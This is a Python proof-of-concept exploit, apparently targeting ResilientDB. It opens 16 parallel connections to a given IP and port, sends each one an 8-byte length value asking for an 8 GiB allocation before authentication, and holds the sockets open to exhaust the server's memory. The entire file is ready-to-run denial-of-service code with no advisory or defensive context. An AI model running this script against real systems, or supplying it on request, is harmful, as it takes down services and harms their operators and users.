import threading
import struct
import socket
import time
import sys

def hit(ip, port, alloc):
    try:
        s = socket.create_connection((ip, port), timeout=5)
        s.sendall(struct.pack("<Q", alloc))
        time.sleep(30)
        s.close()
    except Exception as e:
        print(f"[!] {e}")

def main():
    if len(sys.argv) < 3:
        print("usage: resilientdb_poc.py <ip> <port> 8589934592 16"); return
    ip = sys.argv[1]; port = int(sys.argv[2])
    alloc = int(sys.argv[3]) if len(sys.argv) > 3 else (8 * 1024**3)
    conns = int(sys.argv[4]) if len(sys.argv) > 4 else 16
    print(f"[*] {ip}:{port}  ->  {conns} connections x malloc({alloc} bytes) pre-auth")
    ts = [threading.Thread(target=hit, args=(ip, port, alloc), daemon=True) for _ in range(conns)]
    for t in ts: t.start()
    for t in ts: t.join()
    print("[*] OoMd.")

if __name__ == "__main__":
    main()
